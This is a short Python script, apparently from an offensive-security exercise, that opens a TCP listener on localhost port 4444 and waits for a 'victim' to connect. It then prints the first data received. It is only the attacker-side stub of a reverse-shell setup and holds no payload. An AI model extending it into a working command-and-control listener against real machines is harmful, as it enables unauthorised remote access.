import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("localhost", 4444))
listener.listen(0)

while True:
    print('Waiting for connection from victim.')
    client_conn, address = listener.accept()
    response = client_conn.recv(1024)
    print(response)

